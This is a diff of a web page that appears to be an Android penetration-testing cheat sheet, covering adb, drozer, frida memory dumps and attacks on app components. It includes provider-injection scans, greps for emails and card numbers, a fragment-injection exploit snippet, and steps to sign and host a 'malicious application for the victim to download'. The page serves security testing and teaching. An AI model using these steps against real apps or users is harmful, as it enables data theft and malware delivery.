@@ -139,6 +139,7 @@
   <aside>
    <nav id="TableOfContents">
   <ul>
+    <li><a href="#prerequisites">Prerequisites</a></li>
     <li><a href="#adb">ADB</a></li>
     <li><a href="#jdb">JDB</a></li>
     <li><a href="#runtime-attacks">Runtime Attacks</a></li>
@@ -149,7 +150,7 @@
     <li><a href="#metasploit">Metasploit</a></li>
     <li><a href="#networking">Networking</a></li>
     <li><a href="#script-for-data-leak-autocheck">Script for data leak autocheck</a></li>
-    <li><a href="#sensitive-info-greps">Sensitive info greps</a></li>
+    <li><a href="#useful-greps">Useful greps</a></li>
     <li><a href="#expoits">Expoits</a>
       <ul>
         <li><a href="#fragment-injection">Fragment injection</a></li>
@@ -185,7 +186,27 @@
 
 
   <div class="content" itemprop="articleBody">
-    <h2 id="adb">ADB</h2>
+    <h2 id="prerequisites">Prerequisites</h2>
+<p>Get package name:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># on Android</span> 
+./frida-server-XX
+
+<span class="c1"># on PC, option 1</span>
+frida-ps -U <span class="p">|</span> grep <span class="o">[</span>partial_name<span class="o">]</span>
+<span class="c1"># on PC, option 2</span>
+drozer console connect
+run app.package.list
+<span class="c1"># on PC, option 3</span>
+adb shell
+<span class="nb">cd</span> /data/data/
+ls <span class="p">|</span> grep <span class="o">[</span>partial_name<span class="o">]</span>
+</code></pre></div><p>Get path to apk</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># on PC, option 1</span>
+adb shell pm path <span class="o">[</span>package_name<span class="o">]</span>
+<span class="c1"># on PC, option 2</span>
+drozer console connect
+run app.package.info –a <span class="o">[</span>package_name<span class="o">]</span>
+</code></pre></div><h2 id="adb">ADB</h2>
 <p>On mobile <a href="https://tunesgo.wondershare.com/android/enable-android-developer-options.html?gclid=EAIaIQobChMI5qTXtM3c6wIViqkYCh3TOQy4EAAYASAAEgIZsvD_BwE">enable</a> developer&rsquo;s mode and USB debugging. Trust the PC with adb when prompted on mobile.</p>
 <p>Usefull commands:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb install <span class="o">[</span>appname<span class="o">]</span>.apk
@@ -213,7 +234,6 @@ java -jar <span class="o">[</span>path_to_abe.jar<span class="o">]</span>/abe.ja
 
 dd <span class="k">if</span><span class="o">=</span>backup.ab <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">24</span> <span class="p">|</span> python -c <span class="s2">&#34;import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))&#34;</span> &gt; backup.tar <span class="c1"># linux option1</span>
 dd <span class="k">if</span><span class="o">=</span>mybackup.ab <span class="nv">bs</span><span class="o">=</span><span class="m">24</span> <span class="nv">skip</span><span class="o">=</span>1<span class="p">|</span>openssl zlib -d &gt; mybackup.tar <span class="c1"># linux option1</span>
-
 
 </code></pre></div><p>Port forwarding example:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb forward tcp:31415 tcp:31415
@@ -263,7 +283,7 @@ memory dumpall <span class="o">[</span>dump_name<span class="o">]</span> <span c
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">
 </code></pre></div><h2 id="memory-dumps">Memory dumps</h2>
 <p><strong>Option 1.</strong></p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python C:<span class="se">\P</span>ython37<span class="se">\S</span>cripts<span class="se">\f</span>ridump.py --usb -r -s --max-size <span class="m">1000000000</span> -o . <span class="o">[</span>package_name<span class="o">]</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python fridump.py --usb -r -s --max-size <span class="m">1000000000</span> -o . <span class="o">[</span>package_name<span class="o">]</span>
 </code></pre></div><p>Result in <code>string.txt</code></p>
 <p><strong>Option 2.</strong></p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
@@ -291,7 +311,7 @@ run app.package.attacksurface<span class="o">[</span>package_name<span class="o"
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.activity.info -a <span class="o">[</span>package_name<span class="o">]</span>
 run app.activity.start --component <span class="o">[</span>package_name<span class="o">]</span> <span class="o">[</span>activity_full_name<span class="o">]</span>
 </code></pre></div><p>Attacks on broadcast receivers:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.broadcast.info -a com.android.insecurebankv2
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.broadcast.info -a <span class="o">[</span>package_name<span class="o">]</span>
 </code></pre></div><p>Custom URL Schemes:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.activity.browsable -a <span class="o">[</span>package_name<span class="o">]</span> <span class="c1"># to find browsable activities</span>
 dz&gt; run app.activity.start  --action android.intent.action.VIEW --data-uri <span class="s2">&#34;sms://0123456789&#34;</span> <span class="c1"># to launch such activity with parameters passed</span>
@@ -299,7 +319,7 @@ dz&gt; run app.activity.start  --action android.intent.action.VIEW --data-uri <s
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.provider.finduris -a <span class="o">[</span>package_name<span class="o">]</span>
 run app.provider.query content://<span class="o">[</span>URI_to_the_content<span class="o">]</span>
 run app.provider.query content:// <span class="o">[</span>package_name<span class="o">]</span>.<span class="o">[</span>provider_name<span class="o">]</span> --vertical
-run scanner.provider.injection -a com.android.insecurebankv2
+run scanner.provider.injection -a <span class="o">[</span>package_name<span class="o">]</span>
 </code></pre></div><p>Examples of insert:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.provider.insert content://com.vulnerable.im/messages
 --string date <span class="m">1331763850325</span>
@@ -334,9 +354,10 @@ AndroidManifest.xml
 keytool -genkey  -v -keystore eccouncil.Keystore -alias pentestandroid -keyalg RSA -keysize  <span class="m">2048</span> -validity <span class="m">10000</span>
 
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1  -keystore eccouncil.Keystore mail_temp.apk pentestandroid
-</code></pre></div><p><code>zipalign</code> is an archive alignment tool that provides important optimization to Android application (APK) files. The purpose is to ensure that all uncompressed data starts with a particular alignment relative to the start of the file. Specifically, it causes all uncompressed data within the APK, such as images or raw files, to be aligned on 4-byte boundaries. This allows all portions to be accessed directly with mmap() even if they contain binary data with alignment restrictions. The benefit is a reduction in the amount of RAM consumed when running the application. To do so:</p>
+</code></pre></div><blockquote>
+<p>zipalign` is an archive alignment tool that provides important optimization to Android application (APK) files. The purpose is to ensure that all uncompressed data starts with a particular alignment relative to the start of the file. Specifically, it causes all uncompressed data within the APK, such as images or raw files, to be aligned on 4-byte boundaries. This allows all portions to be accessed directly with mmap() even if they contain binary data with alignment restrictions. The benefit is a reduction in the amount of RAM consumed when running the application. To do so:</p>
+</blockquote>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo su -
-
 zipalign -fv <span class="m">4</span> mail_temp.apk /var/www/html/mail.apk
 What <span class="k">for</span>?
 </code></pre></div><p>Start apache to host the malicious application for the victim to download;</p>
@@ -361,15 +382,14 @@ chmod tcpdump -v -s <span class="m">0</span> -w eccouncil.pc tcpdump -v -s <span
 </code></pre></div><h2 id="script-for-data-leak-autocheck">Script for data leak autocheck</h2>
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">main</span><span class="p">:</span>
   <span class="k">print</span><span class="p">(</span><span class="s2">&#34;not implemented&#34;</span><span class="p">)</span>
-</code></pre></div><h2 id="sensitive-info-greps">Sensitive info greps</h2>
+</code></pre></div><h2 id="useful-greps">Useful greps</h2>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">grep -rP  <span class="s1">&#39;(https?):\/\/(www\.)?[a-z0-9.:].*?(?=\s)&#39;</span> .&gt; ../links.txt <span class="c1"># links</span>
 grep -r -E -o <span class="s2">&#34;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b&#34;</span> . <span class="c1"># email</span>
-grep <span class="o">[</span>login<span class="o">]</span> <span class="p">|</span> <span class="o">[</span>password<span class="o">]</span> <span class="c1"># logins/passwords etc</span>
 grep -r -E -o <span class="s2">&#34;4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> .  <span class="c1"># visa cards numbers</span>
 mstercard grep -r -E -o <span class="s2">&#34;5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&#34;</span> . <span class="c1"># mastercard</span>
 </code></pre></div><h2 id="expoits">Expoits</h2>
 <h3 id="fragment-injection">Fragment injection</h3>
-<p>sdk &lt; 19:</p>
+<p>sdk &lt; 19 &amp;&amp; device &lt; 4.4. The code below is from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/">Mobile Security Guide</a>.</p>
 <div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
 <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
 <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">);</span>
@@ -379,7 +399,7 @@ mstercard grep -r -E -o <span class="s2">&#34;5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4
 </code></pre></div><h2 id="exploiter">Exploiter</h2>
 <p><a href="">Here</a> is the link to my Android application, which implements all common attacks as a &ldquo;malicous&rdquo; application as is described in <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/">Mobile Security Testing Guide</a>. For example, it contains exploit for <a href="/docs/articles/mobile/android/complex-attacks/">this</a> vulnerability.</p>
 <h2 id="introspy">Introspy</h2>
-<p>Installation guide for <a href="https://github.com/iSECPartners/Introspy-iOS">Tracer</a> and <a href="https://github.com/iSECPartners/Introspy-Analyzer">Analyzer</a>. Introduction <a href="http://isecpartners.github.io/Introspy-iOS/">here</a>.</p>
+<p>Installation guide for <a href="https://github.com/iSECPartners/Introspy-iOS">Tracer</a> and <a href="https://github.com/iSECPartners/Introspy-Analyzer">Analyzer</a>. Introduction <a href="http://isecpartners.github.io/Introspy-iOS/">here</a>. Haven&rsquo;t tried on Android yet.</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># install</span>
 pip install git+https://github.com/iSECPartners/Introspy-Analyzer.git
 python -m introspy &lt;args&gt;
